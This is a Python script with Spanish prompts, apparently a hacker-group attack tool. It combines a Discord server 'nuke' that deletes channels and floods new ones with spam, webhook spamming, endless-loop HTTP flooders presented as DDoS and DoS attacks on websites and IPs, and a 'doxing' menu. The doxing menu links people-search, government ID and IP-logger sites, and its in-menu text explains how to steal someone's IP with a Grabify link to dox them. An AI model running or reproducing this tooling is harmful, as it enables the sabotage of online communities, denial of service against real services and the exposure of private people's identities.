import asyncio
import colorama
import aiohttp
import discord
import webbrowser
import requests
import random
import string

colorama.init()

async def delete_channels(guild, num_channels):
    for i in range(num_channels):
        for channel in guild.text_channels:
            await channel.delete()
            print(f"{colorama.Fore.BLUE}Canal eliminado: {channel.name}{colorama.Style.RESET_ALL}")

async def create_channels_and_send_messages(guild, num_channels, channel_name, message):
    for i in range(num_channels):
        channel = await guild.create_text_channel(f"{channel_name}_{i+1}")
        await channel.send(message)
        print(f"{colorama.Fore.BLUE}Nuevo canal '{channel_name}_{i+1}' creado y mensaje enviado.{colorama.Style.RESET_ALL}")

async def create_roles(guild, num_roles, role_name):
    for i in range(num_roles):
        await guild.create_role(name=colorama.Fore.BLUE + f"{role_name}_{i+1}" + colorama.Style.RESET_ALL)
        print(f"{colorama.Fore.BLUE}Nuevo rol '{role_name}_{i+1}' creado.{colorama.Style.RESET_ALL}")

async def change_server_name(guild, new_name):
    await guild.edit(name=new_name)
    print(f"{colorama.Fore.BLUE}Nombre del servidor cambiado a '{new_name}'.{colorama.Style.RESET_ALL}")

async def webhook_spammer():
    url = input("Por favor, introduce la URL del webhook: ")
    message = input("Por favor, introduce el mensaje que deseas enviar: ")
    num_messages = int(input("Por favor, introduce cuántos mensajes deseas enviar: "))

    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(url, session=session)

        for i in range(num_messages):
            await webhook.send(message)
            print(f"{colorama.Fore.BLUE}Mensaje {i+1}/{num_messages} enviado.{colorama.Style.RESET_ALL}")

async def main_menu():
    while True:
        print(colorama.Fore.BLUE + "▄▄▄█████▓ ▒█████   ██▓███  ▄▄▄█████▓▓█████  ██▀███  ")
        print("▓  ██▒ ▓▒▒██▒  ██▒▓██░  ██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒")
        print("▒ ▓██░ ▒░▒██░  ██▒▓██░ ██▓▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒")
        print("░ ▓██▓ ░ ▒██   ██░▒██▄█▓▒ ▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  ")
        print("  ▒██▒ ░ ░ ████▓▒░▒██▒ ░  ░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒")
        print("  ▒ ░░   ░ ▒░▒░▒░ ▒▓▒░ ░  ░  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░")
        print("    ░      ░ ▒ ▒░ ░▒ ░         ░     ░ ░  ░  ░▒ ░ ▒░")
        print("  ░      ░ ░ ░ ▒  ░░         ░         ░     ░░   ░ ")
        print("             ░ ░                       ░  ░   ░     " + colorama.Style.RESET_ALL)

        print("                 by AL4 Yael NAN squad!")

        print("Por favor, selecciona una opción:")
        print("1. Nuke (discord)")
        print("2. Crear roles (discord)")
        print("3. Cambiar nombre del servidor (discord)")
        print("4. Webhook Spammer (discord)")
        print("5. DDoS a un sitio web")
        print("6. DoS a una dirección IP")
        print("7. Uttpo Doxing Tool")
        print("8. Salir")

        option = input("Opción: ")
        if option == "1":
            await nuke()
        elif option == "2":
            await create_roles_menu()
        elif option == "3":
            await change_server_name_menu()
        elif option == "4":
            await webhook_spammer()
        elif option == "5":
            await ddos_website()
        elif option == "6":
            await dos_ip()
        elif option == "7":
            await uttpo_menu()
        elif option == "8":
            print("Saliendo...")
            break
        else:
            print("Opción no válida. Por favor, selecciona una opción válida.")

async def nuke():
    token = input("Por favor, introduce el token del bot de Discord: ")

    intents = discord.Intents.default()
    intents.guilds = True
    intents.messages = True
    intents.guild_messages = True

    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        print(f'Conectado como {client.user}')

        guild_id = int(input("Por favor, introduce la ID del servidor: "))
        guild = client.get_guild(guild_id)
        
        if guild is None:
            print("No se encontró el servidor con la ID proporcionada.")
            await client.close()
            return

        num_channels_to_delete = int(input("¿Cuántos canales deseas eliminar? "))
        channel_name = input("Por favor, introduce el nombre base para los nuevos canales: ")
        num_channels_to_create = int(input("¿Cuántos canales deseas crear? "))
        message = input("Por favor, introduce el mensaje que deseas enviar en los canales: ")

        await delete_channels(guild, num_channels_to_delete)

        await create_channels_and_send_messages(guild, num_channels_to_create, channel_name, message)

        await client.close()

    await client.start(token)
    await main_menu()

async def create_roles_menu():
    token = input("Por favor, introduce el token del bot de Discord: ")

    intents = discord.Intents.default()
    intents.guilds = True
    intents.messages = True
    intents.guild_messages = True

    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        print(f'Conectado como {client.user}')

        guild_id = int(input("Por favor, introduce la ID del servidor: "))
        guild = client.get_guild(guild_id)
        
        if guild is None:
            print("No se encontró el servidor con la ID proporcionada.")
            await client.close()
            return

        num_roles = int(input("¿Cuántos roles deseas crear? "))
        role_name = input("Por favor, introduce el nombre base para los nuevos roles: ")

        await create_roles(guild, num_roles, role_name)

        await client.close()

    await client.start(token)
    await main_menu()

async def change_server_name_menu():
    token = input("Por favor, introduce el token del bot de Discord: ")

    intents = discord.Intents.default()
    intents.guilds = True
    intents.messages = True
    intents.guild_messages = True

    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        print(f'Conectado como {client.user}')

        guild_id = int(input("Por favor, introduce la ID del servidor: "))
        guild = client.get_guild(guild_id)
        
        if guild is None:
            print("No se encontró el servidor con la ID proporcionada.")
            await client.close()
            return

        new_name = input("Por favor, introduce el nuevo nombre para el servidor: ")

        await change_server_name(guild, new_name)

        await client.close()

    await client.start(token)
    await main_menu()

async def ddos_website():
    url = input("Por favor, introduce la URL del sitio web para realizar el ataque DDoS: ")
    try:
        threads = int(input("Por favor, introduce la cantidad de hilos para el ataque DDoS: "))
        if threads <= 0:
            raise ValueError
    except ValueError:
        print("La cantidad de hilos debe ser un número entero mayor que 0.")
        return
    await ddos(url, threads)

async def dos_ip():
    ip = input("Por favor, introduce la dirección IP para realizar el ataque DoS: ")
    try:
        num_requests = int(input("Por favor, introduce la cantidad de solicitudes para el ataque DoS: "))
        if num_requests <= 0:
            raise ValueError
    except ValueError:
        print("La cantidad de solicitudes debe ser un número entero mayor que 0.")
        return
    await dos(ip, num_requests)

async def ddos(target, threads):
    async def attack():
        while True:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(target) as response:
                        print(f"Request sent to {target}!")
            except aiohttp.ClientConnectorError:
                print("[!!!] " + "Connection error!")

    for _ in range(threads):
        asyncio.create_task(attack())

    while True:
        await asyncio.sleep(1)

async def dos(target, num_requests):
    async def attack():
        while True:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(f"http://{target}") as response:
                        print(f"Request sent to {target}!")
            except aiohttp.ClientConnectorError:
                print("[!!!] " + "Connection error!")

    for _ in range(num_requests):
        asyncio.create_task(attack())

    while True:
        await asyncio.sleep(1)

async def uttpo_menu():
    print("\033[92m█    ██ ▄▄▄█████▓▄▄▄█████▓ ██▓███      ▒█████  ")
    print("██  ▓██▒▓  ██▒ ▓▒▓  ██▒ ▓▒▓██░  ██▒   ▒██▒  ██▒")
    print("▓██  ▒██░▒ ▓██░ ▒░▒ ▓██░ ▒░▓██░ ██▓▒   ▒██░  ██▒")
    print("▓▓█  ░██░░ ▓██▓ ░ ░ ▓██▓ ░ ▒██▄█▓▒ ▒   ▒██   ██░")
    print("▒█████▓   ▒██▒ ░   ▒██▒ ░  ▒██▒ ░  ░   ░ ████▓▒░")
    print("░▒▓▒ ▒ ▒   ▒ ░4     ▒ ░░   ▒▓▒░ ░  ░   1 ▒░0░▒4 ")
    print("░▒░ ░  ░   7 ░      ░    ░▒ ░          ░ ▒ ▒░ ")
    print(" ░░░ ░ ░   ░        ░      ░0          ░ ░ 2 ▒  ")
    print("   ░           by Yael   AL4               ░ ░  ")
    print("_____________________________________")
    print("| _________________________________ |")
    print("\033[92m||Selecciona una opción:           ||")
    print("\033[92m||1. Buscar por CURP               ||")
    print("\033[92m||2. Buscar por IP                 ||")
    print("\033[92m||3. Buscar PayPal por Gmail       ||")
    print("\033[92m||4. Búsqueda en Pipl              ||")
    print("\033[92m||5. Grabify IP Stealer            ||")
    print("\033[92m||6. Buscar por servicios del SAT  ||")
    print("\033[92m||7. Buscar por número telefónico  ||")
    print("||8. Volver al menú principal      ||") 
    print("||_________________________________||")      
    print("|___________________________________|")
    print("guia para subnormales! si quieres sacar una ip")
    print("pon la opcion 5 pon un link enviaselo a alguien")
    print("y que lo habra copia la ip usa la opcion 2 ponla")
    print("y ya ya doxeaste a alguien!")
    opcion = input("Tu elección (1/2/3/4/5/6/7/8): ")

    if opcion == "1":
        buscar_por_CURP()
    elif opcion == "2":
        buscar_por_IP()
    elif opcion == "3":
        buscar_paypal_por_gmail()
    elif opcion == "4":
        pipl_search()
    elif opcion == "5":
        grabify()
    elif opcion == "6":
        buscar_por_servicios_sat()
    elif opcion == "7":
        buscar_por_numero_telefonico()
    elif opcion == "8":
        await main_menu()
    else:
        print("Opción no válida. Por favor, selecciona 1, 2, 3, 4, 5, 6, 7 u 8.")

def buscar_por_CURP():
    url = "https://www.gob.mx/curp/"
    webbrowser.open(url)

def pipl_search():
    url = "https://pipl.com/"
    webbrowser.open(url)

def grabify():
    url = "https://grabify.link/"
    webbrowser.open(url)

def buscar_por_IP():
    ip = input("Introduce la dirección IP que deseas buscar: ")
    url = f"https://www.g-force.ca/en/hosting/ip-whois?ip={ip}"
    webbrowser.open(url)

def buscar_paypal_por_gmail():
    gmail = input("Introduce la dirección de correo electrónico de PayPal: ")
    url = f"https://www.google.com/search?q=site:paypal.com+{gmail}"
    webbrowser.open(url)

def buscar_por_servicios_sat():
    rfc = input("Introduce el RFC que deseas buscar: ")
    url = f"https://portalsat.plataforma.sat.gob.mx/ConsultaRFC/"
    webbrowser.open(url)

def buscar_por_numero_telefonico():
    telefono = input("Introduce el número telefónico que deseas buscar: ")
    url = f"https://www.truepeoplesearch.com/results?phoneno={telefono}"
    webbrowser.open(url)

asyncio.run(main_menu())
